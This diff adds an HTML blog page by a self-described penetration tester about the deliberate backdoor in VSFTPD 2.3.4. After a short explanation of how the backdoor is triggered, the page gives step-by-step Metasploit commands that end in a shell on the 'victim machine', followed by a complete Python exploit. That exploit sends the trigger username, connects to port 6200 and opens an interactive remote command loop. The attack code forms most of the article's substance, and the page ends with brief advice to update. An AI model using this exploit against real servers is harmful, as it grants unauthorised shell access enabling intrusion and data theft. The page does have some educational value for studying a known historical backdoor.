@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>everythingBlackkk</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/atom-one-dark.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <link rel="stylesheet" href="VSFTPD.css">
+</head>
+<body class="custom-bg text-white font-sans">
+    <div class="flex">
+        <!-- Left Section -->
+        <div class="left-section">
+            <div class="content-wrapper text-center">
+                <img src="../../Media/everythingBlackkk.png" alt="Profile" class="rounded-full w-48 h-48 mb-4 mx-auto relative z-10">
+                <h1 class="text-5xl font-bold gradient-text">Yassin Abdelrazik</h1>
+                <p class="text-xl text-gray-400">penetration tester | Red Team</p>
+                <a href="https://mail.google.com/mail/?view=cm&fs=1&to=snpxblack2006@gmail.com">
+                    <button class="py-2 px-4 bg-gray-700 text-white rounded-lg hover-email text-sm md:text-base">
+                        Email me
+                    </button>
+                </a>
+            </div>
+            <div class="mt-8 flex gap-4">
+                <a href="https://github.com/everythingBlackkk" target="_blank" class="social-icon-link">
+                    <i class="fab fa-github"></i>
+                </a>
+                <a href="https://www.linkedin.com/in/everythingblackkk/" target="_blank" class="social-icon-link">
+                    <i class="fab fa-linkedin"></i>
+                </a>
+                <a href="https://www.facebook.com/profile.php?id=61553182226299" target="_blank" class="social-icon-link">
+                    <i class="fab fa-facebook"></i>
+                </a>
+                <a href="https://x.com/iyassinmo" target="_blank" class="social-icon-link">
+                    <i class="fab fa-twitter"></i>
+                </a>
+            </div>
+        </div>
+
+        <!-- Right Section (Article Content) -->
+        <div class="right-section">
+            <div class="Sahm">
+                <a href="../../index.html" class="home-btn" style="font-size: 24px; display: flex; align-items: center;">
+                    <div style="background-color: rgba(128, 128, 128, 0.6); border-radius: 12px; padding: 10px 20px; display: flex; align-items: center; backdrop-filter: blur(5px); border: 1px solid rgba(255, 255, 255, 0.5);">
+                        <span style="font-size: 24px;">Home Page</span>
+                        <a href="p1.html" style="margin-left: 10px; display: flex; align-items: center;">
+                            <div style="background-color: gray; border-radius: 50%; padding: 5px; display: flex; justify-content: center; align-items: center;">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="white">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                                </svg>
+                            </div>
+                        </a>
+                    </div>
+                </a>
+            </div>
+            
+            <div class="content-wrapper">
+                <h1 class="text-4xl font-bold mb-6">Understanding Vulnerabilities in VSFTPD 2.3.4</h1>
+                
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">What is VSFTPD?</h2>
+                    <p class="mb-4">VSFTPD (Very Secure File Transfer Protocol Daemon) is a widely used FTP server for Unix-like systems known for its speed and security. However, like any software, it may contain vulnerabilities.</p>
+                </div>
+                <img src="What-is-FTP.jpg" >
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">What is the Vulnerability in VSFTPD 2.3.4?</h2>
+                    <p class="mb-4">VSFTPD 2.3.4 has a well-known backdoor vulnerability. This specific version contains a malicious code that, when exploited, allows attackers to gain unauthorized access to the server. The backdoor is triggered when a user connects to the FTP service and enters a smiley face :) as the username. Once this is done, the server opens a shell on port 6200, giving the attacker control over the system.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Why Does This Vulnerability Exist?</h2>
+                    <p class="mb-4">The vulnerability is believed to have been introduced by a malicious party who tampered with the source code before its release. It's not a flaw that developers created by accident but rather a deliberate backdoor introduced into the system.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">How can it be exploited through Metasploit?</h2>
+                    <p class="mb-4">Run these commands:</p>
+                    <pre><code class="language-bash">1 - msfconsole
+2 - search vsftpd
+3 - use exploit/unix/ftp/vsftpd_234_backdoor
+4 - set RHOSTS &lt;Target Ip&gt;
+5 - exploit
+### Now You Have Shell in Victim Machine ###</code></pre>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">My Exploit</h2>
+                    <pre><code class="language-python">import socket
+import sys
+import time
+
+def trigger_backdoor(ip, port=21):
+    print(f"[*] Checking FTP Version on {ip}:{port}")
+    try:
+        with socket.create_connection((ip, port), timeout=10) as sock:
+            banner = sock.recv(1024).decode()
+            version = banner.split("vsFTPd ")[1].split(")")[0]
+            if version != "2.3.4":
+                print(f"[!] Target version {version} is not vulnerable. Exploit requires vsFTPd 2.3.4.")
+                return False
+            else:
+                print("[+] Target is running vsFTPd 2.3.4. Proceeding with backdoor exploit...")
+                sock.sendall(b"USER everythingBlackkk:)\r\n")
+                sock.recv(1024) # Receive response
+                sock.sendall(b"PASS fsociety\r\n")
+                return True
+    except Exception as e:
+        print(f"[!] Error during FTP connection: {e}")
+        return False
+
+def get_shell(ip):
+    print(f"[*] Connecting to backdoor on {ip}:6200...")
+    time.sleep(1)
+    try:
+        with socket.create_connection((ip, 6200), timeout=10) as sock:
+            print("[+] Connection successful! You now have shell access.")
+            while True:
+                command = input("$ ").strip()
+                if command.lower() in ['exit', 'quit']:
+                    break
+                sock.sendall(f"{command}\n".encode())
+                response = sock.recv(4096).decode()
+                print(response, end='')
+    except Exception as e:
+        print(f"[!] Failed to connect to backdoor: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3 or sys.argv[1] != "-host":
+        print("Usage: python3 script.py -host &lt;target_ip&gt; [port]")
+        sys.exit(1)
+    
+    target_ip = sys.argv[2]
+    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 21
+    
+    print("[*] Initiating FTP backdoor exploit...")
+    if trigger_backdoor(target_ip, target_port):
+        get_shell(target_ip)
+
+# Usage: python3 exploit.py -host &lt;target_ip&gt;</code></pre>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Why is it Dangerous?</h2>
+                    <p class="mb-4">Once the backdoor is exploited, attackers can gain full access to the server, execute commands, steal sensitive data, or launch further attacks on the network. This makes it a severe threat to systems running this version.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Conclusion</h2>
+                    <p class="mb-4">VSFTPD 2.3.4 vulnerability demonstrates the importance of keeping software up to date and only downloading from trusted sources. If you're running this version, it's crucial to update to a newer, secure version to protect your system from potential attacks.</p>
+                </div>
+                    <h1>Mady By Made by ❤ everythingBlackkk
+                    </h1>
+            </div>
+        </div>
+    </div>
+
+    <div class="gif-bg"></div>
+    <div class="pattern-bg"></div>
+</body>
+</html>
